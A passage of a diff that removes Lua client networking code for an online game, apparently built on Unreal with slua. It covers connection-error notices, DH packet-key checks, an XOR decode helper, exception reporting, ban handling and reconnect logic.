-    log(bWriteLog and "shared success")
-    ShareMgr.onShareResult(1, "")
-    local webModule = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.webModule)
-    local url = webModule:GetURLForComebackAfterShare()
-    if url ~= nil then
-      log(bWriteLog and "NetUtil.OnNetworkEvent, auto OpenURL afer share, url = " .. tostring(url))
-      url = webModule:AddParameterByPersonalInfo(url)
-      local WebviewSDK = require("client.slua.logic.url.logic_webview_sdk")
-      WebviewSDK:OpenURL(url)
-    end
-  elseif eventID == 253 then
-    log(bWriteLog and "NetUtil.OnNetworkEvent, OnMigrationNotify, result = " .. tostring(eventParam))
-    local ui = UIManager.GetUI(UIManager.UI_Config.data_migration)
-    if ui ~= nil then
-      UIManager.CloseUI(UIManager.UI_Config.data_migration)
-    end
-    local DataMigrationSystem = require("client.slua.logic.data_migration.data_migration_logic")
-    log(bWriteLog and "[DeanJYT] NetUtil.OnNetworkEvent, OnMigrationNotify isDoneNextStep = " .. tostring(DataMigrationSystem.isDoneNextStep) .. ", nextStep type = " .. tostring(type(DataMigrationSystem.nextStep)))
-    if not DataMigrationSystem.isDoneNextStep and DataMigrationSystem.nextStep then
-      DataMigrationSystem.nextStep()
-    end
-    if eventParam == 1 then
-      local login = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-      login:sendLogout()
-      DataMigrationSystem.SetNoticeId(21194)
-    elseif eventParam == -741 then
-      ShowNotice(LocUtil.GetLocalizeResStr(11595))
-    elseif eventParam == 2 then
-    else
-      ShowNotice(LocUtil.GetLocalizeResStr(740002))
-    end
-  elseif eventID == 255 then
-    log(bWriteLog and "received bind intl event,eventid : " .. eventParam)
-    IMSDKSystem.StopIMSDKTimer()
-    EventSystem:postEvent(EVENTTYPE_BIND_INTL, EVENTID_INTL_BIND_NOTIFY, eventParam)
-  end
-end
-
-function NetUtil.ShowUnifiedAccountException()
-  local title = LocUtil.GetLocalizeResStr(101001)
-  local notice = LocUtil.GetLocalizeResStr(778877)
-  local linkCallbackHandler = function()
-    local LogicCustomerService = require("client.slua.logic.CustomerService.LogicCustomerService")
-    LogicCustomerService.HelpshiftShowFAQsWithInfo()
-  end
-  local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-  CommonMsgBoxMgr.Show(1, title, notice, nil, nil, nil, nil, {urlHandle = linkCallbackHandler})
-end
-
-function NetUtil.ShowMsgCommonMsg(noticeID)
-  log(bWriteLog and "  NetUtil.ShowMsgCommonMsg. noticeID: " .. tostring(noticeID))
-  noticeID = noticeID or 778877
-  local title = LocUtil.GetLocalizeResStr(101001)
-  local notice = LocUtil.GetLocalizeResStr(noticeID)
-  local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-  CommonMsgBoxMgr.Show(1, title, notice)
-end
-
-function NetUtil.GetSDKErrorNotice(eventParam, eventParam2)
-  local notice = LocUtil.GetLocalizeResStr(101205)
-  if not PublishRegionMacros.IsGlobalOperationRegion() then
-    notice = notice .. string.format(" (%d,%d)", eventParam, eventParam2)
-  end
-  local DevicePlatformNameMacros = require("client.slua.config.ClientMacros.DevicePlatformNameMacros")
-  if eventParam == 11016 then
-    notice = LocUtil.GetLocalizeResStr(4178)
-  elseif eventParam == 11500 then
-    notice = LocUtil.GetLocalizeResStr(4179)
-  elseif eventParam == 11005 then
-    notice = LocUtil.GetLocalizeResStr(4180)
-  elseif eventParam == 11020 then
-    notice = LocUtil.GetLocalizeResStr(4181)
-  elseif eventParam == 11003 then
-    notice = LocUtil.GetLocalizeResStr(4182)
-  elseif eventParam == 11001 then
-    notice = LocUtil.GetLocalizeResStr(4183)
-  elseif eventParam == 11002 then
-    notice = LocUtil.GetLocalizeResStr(4184)
-  elseif eventParam == 20002 then
-    notice = LocUtil.GetLocalizeResStr(4322)
-  elseif eventParam2 == 2001 then
-    notice = LocUtil.GetLocalizeResStr(200000149)
-  elseif eventParam == 9999 and Client.GetLoginChannel(NetInterface) == BP_ENUM_PLAYFORM_TWITTER and Client.GetDevicePlatformName() == DevicePlatformNameMacros.Android and Client.IsInstallTwitter(NetInterface) == false then
-    notice = LocUtil.GetLocalizeResStr(7496)
-  end
-  return notice
-end
-
-function NetUtil.ShowSDKErrorNotice(eventParam, eventParam2)
-  local title = LocUtil.GetLocalizeResStr(101001)
-  local notice = ""
-  if Client.GetLoginChannel(NetInterface) == BP_ENUM_PLAYFORM_UnifiedAccountByiTOP then
-    notice = LocUtil.GetLocalizeResStr(101205)
-  else
-    notice = LocUtil.GetLocalizeResStr(101100 + eventParam)
-  end
-  if eventParam2 == 2001 then
-    notice = LocUtil.GetLocalizeResStr(200000149)
-  elseif eventParam2 == -566 then
-    notice = LocUtil.GetLocalizeResStr(75472)
-  end
-  if notice ~= "" then
-    local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-    if eventParam2 ~= 2001 and eventParam2 ~= -566 then
-      notice = notice .. string.format(" (%d,%d)", eventParam, eventParam2)
-    end
-    CommonMsgBoxMgr.Show(1, title, notice)
-  end
-end
-
-function NetUtil.OnDSServerConnectionErrorNotify(gameID, reason)
-  log(bWriteLog and "ClientEntry -----  OnDSServerConnectionErrorNotify -------- gameID:" .. gameID .. ", reason:" .. reason .. ", BattleResult:" .. tostring(BattleResult.IgnoreDSError))
-  if BattleResult.IgnoreDSError then
-    log(bWriteLog and "ClientEntry -----  BattleResult.IgnoreDSError return！！！！")
-    return
-  end
-  local isUGCLoadError = false
-  if reason == "load_ugc_err" then
-    isUGCLoadError = true
-    local LogicUGCCRUD = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.LogicUGCCRUD)
-    if LogicUGCCRUD:GetIsEditMod() then
-      LogicUGCCRUD:SetIsEditMod(false)
-      LobbySystem.SetWaitingBattleFlag(false)
-      NetUtil.StopCheckEnterBattle()
-    elseif LobbySystem.isWaittingEnterBattle then
-      LobbySystem.SetWaitingBattleFlag(false)
-      NetUtil.StopCheckEnterBattle()
-    end
-  end
-  local curStatus = LuaClassObj.GetGameStatus(bp_global)
-  log(bWriteLog and "NetUtil.OnDSServerConnectionErrorNotify curStatus = " .. tostring(curStatus))
-  if curStatus ~= GameStatus.Fighting then
-    log(bWriteLog and "ClientEntry -----  not in fighting dont show msgbox!!!" .. curStatus)
-    if isUGCLoadError then
-      local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-      LoadingSystem.RefreshLoadPercent(1)
-      ShowNotice(511009)
-    end
-  end
-  if GameStatus.IsInLobbyOrMainCity() then
-    log(bWriteLog and "NetUtil.OnDSServerConnectionErrorNotify ClientEntry IsLobbyOrMainCity")
-    if slua_GameFrontendHUD and slua_GameFrontendHUD.UnrealNetworkStatus then
-      log(bWriteLog and "NetUtil.OnDSServerConnectionErrorNotify 1 UnrealNetworkStatus = " .. tostring(slua_GameFrontendHUD.UnrealNetworkStatus) .. " g_game_id = " .. tostring(g_game_id))
-      if g_game_id and gameID and g_game_id == gameID then
-        log(bWriteLog and "NetUtil.OnDSServerConnectionErrorNotify modify UnrealNetworkStatus")
-        slua_GameFrontendHUD.UnrealNetworkStatus = "Offline"
-      end
-      log(bWriteLog and "NetUtil.OnDSServerConnectionErrorNotify 2 UnrealNetworkStatus = " .. tostring(slua_GameFrontendHUD.UnrealNetworkStatus))
-    end
-    local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-    LoadingSystem.RefreshLoadPercent(1)
-    if LobbySystem.is_DeathMatchMode then
-      local TeamCompLoading = require("client.slua.logic.loading.logic_teamcomp_loading")
-      TeamCompLoading.RefreshLoadPercent(1)
-    end
-    EventSystem:postEvent(EVENTTYPE_NETWORK, EVENTID_MAIN_CITY_DS_CONNECTION_ERROR, gameID, reason)
-    return
-  end
-  if curStatus ~= GameStatus.Fighting then
-    return
-  end
-  local strTile = LocUtil.GetLocalizeResStr(102012)
-  local strMsg = LocUtil.GetLocalizeResStr(301229)
-  if reason == "timeout" then
-    strMsg = LocUtil.GetLocalizeResStr(301230)
-  elseif reason == "active-timeout" then
-    strMsg = LocUtil.GetLocalizeResStr(301231)
-  end
-  local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-  CommonMsgBoxMgr.Show(1, strTile, strMsg, function()
-    FuncUtil.ShowLoadingToLobby()
-    Client.ReturnToLobby(GameFrontendHUD)
-    if not NetManager.bConnected and LobbySystem.CheckOpen(BP_ENUM_IS_QUERY_PLAYER_STETE_AFTER_LOADING) then
-      local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-      login_module:reqLoginLobby(true, Enum_LOGIN_REPORT_CFG.DS_ERR)
-    else
-      local MatchSystem = require("client.slua.logic.match.logic_match")
-      MatchSystem.SetQueryPlayerFlag(true)
-    end
-    Client.TPerforPlatDisconnectReport(GameFrontendHUD, 14)
-  end, nil, nil, nil, true)
-end
-
-function NetUtil.LogOut()
-  log(bWriteLog and "ClientEntry ----- NetUtil.LogOut()")
-  NetUtil.SendPkg("logout")
-  if NetUtil.PleaseReloginTimer then
-    local time_ticker = require("common.time_ticker")
-    time_ticker.RemoveTimer(NetUtil.PleaseReloginTimer)
-    NetUtil.PleaseReloginTimer = nil
-  end
-end
-
-function NetUtil.sync_time(serverTime)
-  log(bWriteLog and string.format("sync_time :%s", TimeUtil.FormatTime_YMDHMS(serverTime, true)))
-  TimeUtil.SetServerTimeInSec(serverTime)
-end
-
-function NetUtil.LogoutNoRefresh()
-  NetUtil.noRefreshLogout = true
-  local SettingAccount = require("client.logic.setting.logic_setting_account")
-  SettingAccount.ClientLogout()
-end
-
-function NetUtil.ProcOnDisconnected()
-  NetUtil.tNetDisconnected = TimeUtil.OSTime()
-end
-
-function NetUtil.ProcOnConnecting()
-  NetUtil.tNetConnecting = TimeUtil.OSTime()
-end
-
-function NetUtil.ProcOnConnected()
-  NetUtil.tNetConnected = TimeUtil.OSTime()
-end
-
-function NetUtil.CheckSpecialDeviceNetFlash()
-  if not (NetUtil.tNetDisconnected > 0 and NetUtil.tNetConnecting > NetUtil.tNetDisconnected and NetUtil.tNetConnected > NetUtil.tNetConnecting and NetUtil.tNetConnecting - NetUtil.tNetDisconnected <= 1) or NetUtil.tNetConnected - NetUtil.tNetDisconnected <= 1 then
-  end
-  return false
-end
-
-function NetUtil.MoveFollowTarget(follow_type, follow_uid)
-  follow_uid = follow_uid or 0
-  Client.MoveFollowTarget(GameFrontendHUD, follow_type, follow_uid)
-end
-
-function NetUtil.check_dh_packet_key(packet_key, svr_packet_key_md5, from, dh_ext_info, bReportDSInfo)
-  log(bWriteLog and "NetUtil.check_dh_packet_key")
-  if type(packet_key) ~= "string" then
-    sandbox.LogError("NetUtil.check_dh_packet_key packet_key=" .. tostring(packet_key))
-    return
-  end
-  if type(svr_packet_key_md5) ~= "string" then
-    sandbox.LogError("NetUtil.check_dh_packet_key svr_packet_key_md5=" .. tostring(svr_packet_key_md5))
-    return
-  end
-  local packet_key_md5 = Client.MD5LuaString(packet_key)
-  dh_ext_info.packet_key_md5 = packet_key_md5
-  dh_ext_info.svr_packet_key_md5 = svr_packet_key_md5
-  log_tree("dh_ext_info = ", dh_ext_info)
-  if bReportDSInfo or string.lower(packet_key_md5) ~= string.lower(svr_packet_key_md5) then
-    log(bWriteLog and "NetUtil.check_dh_packet_key report")
-    NetUtil.SendPkg("report_dh_calc_key_error", from, dh_ext_info)
-  end
-  log(bWriteLog and "NetUtil.check_dh_packet_key packet_key_md5=" .. packet_key_md5 .. " svr_packet_key_md5=" .. svr_packet_key_md5)
-end
-
-function NetUtil.DecXorForBattle(src, key)
-  if src == nil then
-    sandbox.LogError("FuncUtil.DecXorForBattle src == nil!")
-    return
-  end
-  if key == nil then
-    sandbox.LogError("FuncUtil.DecXorForBattle key == nil!")
-    return
-  end
-  local ssrc = tostring(src)
-  local ssrc_len = string.len(ssrc)
-  if ssrc_len == 0 then
-    sandbox.LogError("FuncUtil.DecXorForBattle src len == 0!")
-    return
-  end
-  local skey = tostring(key)
-  local skey_len = string.len(skey)
-  if skey_len == 0 then
-    sandbox.LogError("FuncUtil.DecXorForBattle key len == 0!")
-    return
-  end
-  local dec_src = {}
-  local kidx = 1
-  for i = 1, ssrc_len do
-    local ch_src = string.byte(ssrc, i)
-    local ch_key = string.byte(skey, kidx)
-    kidx = kidx % skey_len + 1
-    local ch = ch_src ~ ch_key
-    table.insert(dec_src, string.char(ch))
-  end
-  return table.concat(dec_src)
-end
-
-function NetUtil.ShowDSTimeOutTipsUI(IsShow, nShowMask)
-  local bCurrentDSLongShowTimeOut = NetUtil.nDSTimeOutShowBitMask & NetUtil.DSTimeOutLong
-  if 0 < bCurrentDSLongShowTimeOut and nShowMask > NetUtil.DSTimeOutLong then
-    print(bWriteLog and "NetUtil.ShowDSTimeOutTipsUI forbidden by DS Long timeout, nShowMask:", nShowMask)
-    return
-  end
-  if UIManager.UI_Config_InGame == nil or UIManager.UI_Config_InGame.WeakNetworkUI == nil then
-    return
-  end
-  if IsShow then
-    local WeakNetworkUI = UIManager.GetUI(UIManager.UI_Config_InGame.WeakNetworkUI)
-    if not NetUtil.dsTimeOutTipsUIShowing then
-      EventSystem:postEvent(EVENTTYPE_CLIENT_TLOG, EVENTID_ADD_VALUE_TLOG, "WeakNetworkNum", 1)
-      if WeakNetworkUI == nil then
-        UIManager.ShowUI(UIManager.UI_Config_InGame.WeakNetworkUI)
-      else
-        WeakNetworkUI:ShowWeakIcon()
-      end
-      NetUtil.nDSTimeOutShowBitMask = NetUtil.nDSTimeOutShowBitMask | nShowMask
-      NetUtil.dsTimeOutTipsUIShowing = true
-      print(bWriteLog and "NetUtil.ShowDSTimeOutTipsUI  Show nShowMask:", nShowMask)
-    end
-  else
-    local WeakNetworkUI = UIManager.GetUI(UIManager.UI_Config_InGame.WeakNetworkUI)
-    if WeakNetworkUI ~= nil then
-      WeakNetworkUI:HideWeakIcon()
-    end
-    NetUtil.dsTimeOutTipsUIShowing = false
-    NetUtil.nDSTimeOutShowBitMask = NetUtil.nDSTimeOutShowBitMask & ~nShowMask
-    print(bWriteLog and "NetUtil.ShowDSTimeOutTipsUI  Hide nShowMask:", nShowMask)
-  end
-end
-
-function NetUtil.GetAutoReconnectParam()
-  log(bWriteLog and "NetUtil.GetAutoReconnectParam")
-  local param = {
-    times = 2,
-    showFunc = nil,
-    clearFunc = nil
-  }
-  local systemConfig = {
-    {
-      checkFunc = RoomSystem.CheckNeedReconnect,
-      setFunc = RoomSystem.SetAutoReconnectParam
-    }
-  }
-  for i, v in ipairs(systemConfig) do
-    if v.checkFunc() then
-      v.setFunc(param)
-      break
-    end
-  end
-  return param
-end
-
-function NetUtil.ClearAutoReconnectParam()
-  if not NetUtil.AutoReconnectParam then
-    return
-  end
-  log(bWriteLog and "NetUtil.ClearAutoReconnectParam")
-  NetUtil.ClearAutoReconnectTimer()
-  if NetUtil.AutoReconnectParam.clearFunc then
-    NetUtil.AutoReconnectParam.clearFunc()
-  end
-  NetUtil.AutoReconnectParam = nil
-end
-
-function NetUtil.ClearAutoReconnectTimer()
-  if NetUtil.autoReconnectTimer then
-    local timer_ticker = require("common.time_ticker")
-    timer_ticker.RemoveTimer(NetUtil.autoReconnectTimer)
-    NetUtil.autoReconnectTimer = nil
-  end
-end
-
-function NetUtil.NetUnstableReport.RecordChange(bUnstable)
-  local Report = NetUtil.NetUnstableReport
-  if not Report.Enabled then
-    return
-  end
-  if Report.LastRecordedUnstable == bUnstable then
-    return
-  end
-  Report.LastRecordedUnstable = bUnstable
-  local MaxSize = Report.HistoryMaxSize
-  local writeIndex = Report.HistoryHeadIndex
-  Report.History[writeIndex] = {
-    Time = os.time(),
-    Unstable = bUnstable
-  }
-  if MaxSize <= writeIndex then
-    Report.HistoryHeadIndex = 1
-  else
-    Report.HistoryHeadIndex = writeIndex + 1
-  end
-  if MaxSize > Report.HistoryCount then
-    Report.HistoryCount = Report.HistoryCount + 1
-  end
-end
-
-function NetUtil.NetUnstableReport.IsNetUnstableAtTime(queryTime)
-  if type(queryTime) ~= "number" then
-    return false
-  end
-  local Report = NetUtil.NetUnstableReport
-  if not Report.Enabled then
-    return false
-  end
-  local Count = Report.HistoryCount
-  if Count <= 0 then
-    return false
-  end
-  local MaxSize = Report.HistoryMaxSize
-  local newestIndex = Report.HistoryHeadIndex - 1
-  if newestIndex < 1 then
-    newestIndex = MaxSize
-  end
-  for i = 0, Count - 1 do
-    local idx = newestIndex - i
-    if idx < 1 then
-      idx = idx + MaxSize
-    end
-    local record = Report.History[idx]
-    if record ~= nil and queryTime >= record.Time then
-      return record.Unstable
-    end
-  end
-  return false
-end
-
-if _G.IsEnableMockGameSvr then
-  function NetUtil.SendMsgToMockGameSvr(MsgType, ...)
-    print(bWriteLog and string.format("NetUtil.LoginMockGameSvr MsgType = %s", MsgType))
-    
-    if MsgType == "login" then
-      NetUtil.SendPkg("mockgamesvr_login", ...)
-    end
-  end
-end
-UnrealNet.NetworkStatus = {
-  Offline = "Offline",
-  Connecting = "Connecting",
-  Online = "Online",
-  Lost = "Lost",
-  RecoverableLost = "RecoverableLost"
-}
-UnrealNet.NetworkEvent = {
-  RemoteHostResolved = "RemoteHostResolved",
-  NetworkEstablished = "NetworkEstablished",
-  NetworkRecovered = "NetworkRecovered"
-}
-UnrealNet.NetworkException = {
-  FailureReceived = "FailureReceived",
-  ConnectionLost = "ConnectionLost",
-  ConnectionTimeout = "ConnectionTimeout",
-  ConnectionLongTimeNoReceived = "ConnectionLongTimeNoReceived",
-  ConnectingTimeout = "ConnectingTimeout",
-  PendingConnectionFailure = "PendingConnectionFailure",
-  CriticalSocketError = "CriticalSocketError",
-  ActorChannelError = "ActorChannelError"
-}
-UnrealNet.FailureReceivedReason = {
-  CharacterDead = "CharacterDead",
-  TeammatesAllDead = "TeammatesAllDead",
-  GameOver = "GameOver",
-  TrainingOver = "TrainingOver",
-  CheatDetected = "CheatDetected",
-  WatchedPlayerGone = "WatchedPlayerGone",
-  NormalNetDriverShutdown = "Normal_NetDriverShutdown",
-  HostClosedConnection = "Host closed the connection."
-}
-
-function UnrealNet.HandleNetworkEvent(EventType, EventMessage, ...)
-  EventMessage = EventMessage or ""
-  NetUtil.SendPkg("report_unrealnet_event", g_game_id, EventType, EventMessage)
-  if EventType == UnrealNet.NetworkEvent.RemoteHostResolved then
-    return
-  end
-  local curStatus = LuaClassObj.GetGameStatus(bp_global)
-  log(bWriteLog and string.format("gavins NetworkEvent %s, curstatus %s", EventType, curStatus))
-  if EventType == "NetworkEstablished" or EventType == "NetworkRecovered" then
-    logic_connection_waiting:Hide(1)
-    NetUtil.dsTimeOutRetryTimes = 0
-    local logic_main_city_reconnect = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.logic_main_city_reconnect)
-    logic_main_city_reconnect.maincity_dsTimeOutRetryTimes = 0
-    if EventType == "NetworkEstablished" and GameStatus.IsInMainCity() then
-      logic_main_city_reconnect:CheckDSVersion(EventMessage)
-    end
-    NetUtil.StopCheckDSActive()
-    if curStatus == GameStatus.Fighting and not GameStatus.IsInMainCity() then
-      local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-      CommonMsgBoxMgr.HideAllPanel()
-    end
-    NetUtil.ShowDSTimeOutTipsUI(false, NetUtil.DSTimeOutLong)
-  end
-end
-
-function UnrealNet.FilterNetworkException(ExceptionType, ErrorMessage)
-  if ExceptionType == UnrealNet.NetworkException.FailureReceived then
-    if string.find(ErrorMessage, UnrealNet.FailureReceivedReason.NormalNetDriverShutdown) ~= nil then
-      return false
-    end
-    if string.find(ErrorMessage, UnrealNet.FailureReceivedReason.HostClosedConnection) == 1 then
-      return false
-    end
-  end
-  if string.find(ErrorMessage, "SwitchIsland") == 1 then
-    log(bWriteLog and "SwitchIsland is true")
-    return false
-  elseif string.find(ErrorMessage, "Normal_ChannelCleanUp") ~= nil then
-    local curStatus = LuaClassObj.GetGameStatus(bp_global)
-    if curStatus == GameStatus.Login or curStatus == GameStatus.Loading then
-      log(bWriteLog and "Is in login")
-      return false
-    end
-    if LobbySystem and LobbySystem.isWaitToEnterGame then
-      log(bWriteLog and "LobbySystem.isWaitToEnterGame true")
-      return false
-    end
-  end
-  return true
-end
-
-function UnrealNet.NetworkExceptionAddEnterBattleStage(InErrorMessage)
-  local EnterBattleFinishedStage = ""
-  local UIUtil = require("client.common.ui_util")
-  if UIUtil.GetGameFrontendHUD() ~= nil then
-    EnterBattleFinishedStage = "Stage: " .. UIUtil.GetGameFrontendHUD():GetClientEnterBattleStage()
-  end
-  local FinalErrorMessage = ""
-  if InErrorMessage == nil or #InErrorMessage == 0 then
-    FinalErrorMessage = EnterBattleFinishedStage
-  else
-    FinalErrorMessage = EnterBattleFinishedStage .. " " .. InErrorMessage
-  end
-  return FinalErrorMessage
-end
-
-function UnrealNet.HandleNetworkExceptionReport(ExceptionType, SubType, ErrorMessage)
-  local UploadStage = UnrealNet.NetworkExceptionAddEnterBattleStage()
-  local EnterBattleStageCostTime = ""
-  local UIUtil = require("client.common.ui_util")
-  if UIUtil.GetGameFrontendHUD() ~= nil then
-    EnterBattleStageCostTime = UIUtil.GetGameFrontendHUD():GetClientEnterBattleStageCostTime()
-  end
-  local UploadErrorMsg = ErrorMessage .. "Cost:" .. EnterBattleStageCostTime
-  NetUtil.SendPkg("report_unrealnet_exception", g_game_id, ExceptionType, UploadErrorMsg, SubType, UploadStage)
-end
-
-function UnrealNet.HandleNetworkConnectionClosed(ExceptionType, ErrorMessage)
-  if ExceptionType == UnrealNet.FailureReceivedReason.NormalNetDriverShutdown and ErrorMessage == "" or ExceptionType == "Normal_ChannelCleanUp" and ErrorMessage == "" then
-    return
-  end
-  local UploadErrorMessage = string.format("Reason=[%s]&&ErrMsg=[%s]", ExceptionType, ErrorMessage)
-  log(bWriteLog and "UnrealNet.HandleNetworkConnectionClosed ExceptionType = " .. UploadErrorMessage)
-  UnrealNet.HandleNetworkExceptionReport("NetConnectionClosed", ExceptionType, ErrorMessage)
-end
-
-function UnrealNet.HandleSpectateException(ExceptionType, ErrorMessage)
-  local UploadErrorMessage = string.format("Reason=[%s]&&ErrMsg=[%s]", ExceptionType, ErrorMessage)
-  log(bWriteLog and "UnrealNet.HandleNetworkConnectionClosed ExceptionType = " .. UploadErrorMessage)
-  UnrealNet.HandleNetworkExceptionReport("SpectateException", ExceptionType, ErrorMessage)
-end
-
-function UnrealNet.HandleNetworkException(ExceptionType, SubType, ErrorLog, bShouldWait, ...)
-  local ErrorMessage = ErrorLog .. SubType
-  log(bWriteLog and "UnrealNet.HandleNetworkException ExceptionType = " .. ExceptionType .. ", ErrorMessage = " .. ErrorMessage .. ", bShouldWait = " .. tostring(bShouldWait))
-  if UnrealNet.FilterNetworkException(ExceptionType, ErrorMessage) then
-    local UploadErrorMessage = FuncUtil.ReplaceIllegalChar(ErrorLog)
-    UnrealNet.HandleNetworkExceptionReport(ExceptionType, SubType, UploadErrorMessage)
-  end
-  if ExceptionType == UnrealNet.NetworkException.ActorChannelError then
-    return
-  end
-  if ExceptionType == UnrealNet.NetworkException.FailureReceived and string.find(ErrorMessage, UnrealNet.FailureReceivedReason.TrainingOver) == 1 then
-    BattleResultUI.ShowTrainingOverUI()
-    return
-  end
-  local LobbySystem = require("client.logic.login.logic_lobby")
-  local dsVersion = Client.GetDSVersion(GameFrontendHUD)
-  local curStatus = LuaClassObj.GetGameStatus(bp_global)
-  log(bWriteLog and "ClientEntry -----  CurStatus: " .. curStatus .. ", DSVersion: " .. dsVersion)
-  if curStatus == GameStatus.Login then
-    return
-  end
-  local LogicUGCMatch = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.LogicUGCMatch)
-  local isWaitToEnterGame = LobbySystem.isWaitToEnterGame
-  local IsInUGCWaitingEnterGame = LogicUGCMatch:IsInUGCWaitingEnterGame()
-  log(bWriteLog and "ClientEntry isWaitToEnterGame = " .. tostring(isWaitToEnterGame) .. " IsInUGCWaitingEnterGame = " .. tostring(IsInUGCWaitingEnterGame))
-  if curStatus == GameStatus.Fighting and (isWaitToEnterGame or IsInUGCWaitingEnterGame) then
-    log(bWriteLog and "ClientEntry is waiting to enter next game")
-    return
-  end
-  local UIUtil = require("client.common.ui_util")
-  local CurStage = ""
-  if UIUtil ~= nil and UIUtil.GetGameFrontendHUD() ~= nil then
-    CurStage = UIUtil.GetGameFrontendHUD():GetClientEnterBattleStage()
-  end
-  local Lobby_Main_City = require("client.slua.logic.lobby.MainCity.Lobby_Main_City")
-  if not GameStatus.IsInLobbyOrMainCity() and not Lobby_Main_City.IsRecentMainCityGameID(g_game_id) and CurStage ~= "EnterBattleSuccess" and ExceptionType == "ConnectionLongTimeNoReceived" then
-    log(bWriteLog and "Ignore LongTimeNoReceived in enter-battle progress")
-    return
-  end
-  if GameStatus.IsInLobbyOrMainCity() or not Lobby_Main_City.IsRecentMainCityGameID(g_game_id) and CurStage ~= "EnterBattleSuccess" and (ExceptionType == "ConnectionTimeout" or ExceptionType == "CriticalSocketError") then
-    log(bWriteLog and "ClientEntry is main city mode")
-    local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-    LoadingSystem.RefreshLoadPercent(1)
-    if LobbySystem.is_DeathMatchMode then
-      local TeamCompLoading = require("client.slua.logic.loading.logic_teamcomp_loading")
-      TeamCompLoading.RefreshLoadPercent(1)
-    end
-    EventSystem:postEvent(EVENTTYPE_NETWORK, EVENTID_MAIN_CITY_NETWORK_EXCEPTION, ExceptionType, SubType, ErrorLog, bShouldWait)
-    return
-  end
-  if ExceptionType == "FailureReceived" and (string.find(ErrorMessage, "SwitchIsland") == 1 or string.find(ErrorMessage, "switch_level_exit") == 1) then
-  else
-    local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-    LoadingSystem.RefreshLoadPercent(1)
-  end
-  if ExceptionType == "FailureReceived" then
-    if string.find(ErrorMessage, "CharacterDead") == 1 then
-      BattleResultUI.SetIsDirectShow(true)
-    elseif string.find(ErrorMessage, "SwitchIsland") == 1 then
-      return
-    elseif string.find(ErrorMessage, "switch_level_exit") == 1 then
-      log(bWriteLog and "ClientEntry ----- FailureReceived switch_level_exit, ignore")
-      return
-    elseif string.find(ErrorMessage, "IdipBan") == 1 then
-      local banTable = {}
-      for key, value in string.gmatch(ErrorMessage, "(%w+)=([a-zA-Z0-9-,. ]+)") do
-        banTable[key] = value
-      end
-      log_tree("ClientEntry -----  banTable", banTable)
-      if banTable.banType and banTable.banInfo and banTable.banTime ~= nil then
-        local ban_login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.ban_login_module)
-        ban_login_module:on_kickout(banTable.banType, banTable.banInfo, tonumber(banTable.banTime), nil, nil, nil, banTable.linkType)
-        return
-      end
-    end
-  end
-  LobbySystem.enterGameTimeOutParams = table.pack(ExceptionType, SubType, ErrorLog, bShouldWait)
-  local ShowMsgBoxFunc
-  local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-  if UIManager.IsUIShow(UIManager.UI_Config.xmission_main) then
-    ShowMsgBoxFunc = CommonMsgBoxMgr.ShowTPlan
-  else
-    ShowMsgBoxFunc = CommonMsgBoxMgr.Show
-  end
-  local logic_enter_game = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.logic_enter_game)
-  local SubMod = 0
-  if logic_enter_game and logic_enter_game.InGameReEnterGameInfo ~= nil and #logic_enter_game.InGameReEnterGameInfo >= 11 and logic_enter_game.InGameReEnterGameInfo[11] ~= nil then
-    SubMod = logic_enter_game.InGameReEnterGameInfo[11]
-    log(bWriteLog and "UnrealNet.HandleNetworkException SubMod " .. tostring(SubMod))
-  end
-  local SubModeCfg
-  if SubMod ~= 0 then
-    SubModeCfg = CDataTable.GetTableData("BTMode", SubMod)
-  end
-  local TimeOutExtendMod = false
-  if SubModeCfg and SubModeCfg.ModType ~= "TDM" then
-    TimeOutExtendMod = true
-  end
-  log(bWriteLog and "UnrealNet.HandleNetworkException TimeOutExtendMod " .. tostring(TimeOutExtendMod))
-  local TimeOutRetryTimes = 3
-  if TimeOutExtendMod == true then
-    TimeOutRetryTimes = 5
-  end
-  local SmartBearerManagerLuaBridge = import("SmartBearerManagerLuaBridge")
-  local bInGameReconnectImm = false
-  if SmartBearerManagerLuaBridge ~= nil then
-    local bExpandClientTimeOut70s = SmartBearerManagerLuaBridge.IsClientBackEndSwitcherBEnable(9)
-    local bExpandClientTimeOut100s = SmartBearerManagerLuaBridge.IsClientBackEndSwitcherBEnable(10)
-    if bExpandClientTimeOut70s then
-      TimeOutRetryTimes = 6
-    end
-    if bExpandClientTimeOut100s then
-      TimeOutRetryTimes = 9
-    end
-    if SmartBearerManagerLuaBridge.IsClientBackEndSwitcherBEnable(5) then
-      bInGameReconnectImm = true
-      log(bWriteLog and "ClientBackEndSwitcherB_InGameReconnectImm on")
-    else
-      log(bWriteLog and "ClientBackEndSwitcherB_InGameReconnectImm off")
-    end
-  end
-  if not _G.IsEditor and bInGameReconnectImm then
-    TimeOutRetryTimes = 0
-    TimeOutExtendMod = true
-  end
-  if curStatus == GameStatus.Fighting and bShouldWait == true and TimeOutRetryTimes > NetUtil.dsTimeOutRetryTimes and not BattleResult.IgnoreDSError then
-    NetUtil.dsTimeOutRetryTimes = NetUtil.dsTimeOutRetryTimes + 1
-    if NetUtil.dsTimeOutRetryTimes == 1 then
-      local prompt = LocUtil.GetLocalizeResStr(101001)
-      local msg = LocUtil.GetLocalizeResStr(31144)
-      ShowMsgBoxFunc(1, prompt, msg, function()
-      end)
-    end
-    LobbySystem.enterGameTimeOutParams = nil
-    NetUtil.ShowDSTimeOutTipsUI(true, NetUtil.DSTimeOutLong)
-    if NetUtil.dsTimeOutRetryTimes == 1 then
-      local TraceSystem = require("client.slua.logic.network_trace.logic_trace")
